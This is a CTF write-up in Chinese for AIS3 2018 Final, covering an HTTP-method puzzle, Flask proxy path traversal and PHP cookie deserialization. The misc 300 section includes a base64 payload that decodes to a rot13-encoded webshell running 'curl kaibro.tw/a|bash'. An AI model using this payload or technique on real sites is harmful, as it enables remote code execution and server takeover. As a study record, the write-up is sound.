# AIS3 2018 Final

## web 100

這題就是他會告訴你下一個HTTP Method要送啥

你送過去，他就噴給你flag的一個字元

就把它噴完吧

`AIS3{HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!}`

## web 200

這題是Flask題目

他的架構是Reverse Proxy

Client送出request後，Server會再把request發出去 (以這題來說，他是發給自己)

然後Server拿到Response，會先log起來，再回傳給Client

這邊`write_to_file`裡面的os.join沒有嚴格處理好，`clean_url()`可以塞`../`

所以我們就能控制寫檔的路徑惹

而且這邊內容由於會被覆寫，所以只會寫入最後的`r.content`，也就是`QAQ`

然後FLAG要在我們送`ADMIN` method，且指定路徑的檔案內容跟我們送過去的POST data一樣才會噴出來

但這邊路徑沒辦法`../`，我們只能比對`password/`下的內容

所以我們最後可以送`GET /../../../password/kaibro`，他就會把`QAQ`寫到`password/kaibro`

訪問`ADMIN /kaibro`，並POST帶上`QAQ`就能拿到FLAG惹

`AIS3{f1aSk_pr0Xy_5Erver_15_N1Ce!!}`

## misc 300

這題其實是純Web

題目進去是個Web介面，會顯示一頂帽子和一個輸入框

可以輸入色碼，他會改變帽子顏色

稍微踹一下可以發現有`.git`

然後可以還原Source Code

他裡頭在做的事是，他會取出`$_COOKIE['hat_profile']`，然後去`base64_decode()`

最後再`unserialize()`

所以這邊就有一個反序列化漏洞

我們可以控到裡面的`UserProfile`這個class的變數值

裡頭有兩個變數，一個是記錄要寫檔的路徑，一個是記錄內容

但困難點是，雖然內容控得到，但`file_put_contents`的時候，會強制在前面加上`<?php die('Access Denied'); ?>`

所以就得想辦法繞過這個限制，不然我們後面塞啥都不會被執行

這裡用到的trick是，`file_put_contents`第一個參數可以用`php://filter`

這邊我用`rot13`把Access Denied那一段轉成不會被解析的文字

最後，把後面內容控成我們要的內容即可(兩次rot13會還原)

流程就是：先把payload序列化，再base64 encode，最後塞進cookie，然後訪問就會寫檔惹，接著就拿shell

Payload:

`TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6MTc6InNldHRpbmdfc2F2ZV9wYXRoIjtzOjUxOiJwaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnJvdDEzL3Jlc291cmNlPXNoZWxsMy5waHAiO3M6MTc6IgBVc2VyUHJvZmlsZQBkYXRhIjthOjI6e3M6MzoiaGF0IjtzOjE6ImEiO3M6NDoiaGF0MiI7czo0NjoiPD9jdWMgZmxmZ3J6KCdwaGV5IHhudm9lYi5nai9ufG9uZnUnKTs/Pnhudm9lYiI7fX0=`

`AIS3{Conquer_The_World}`
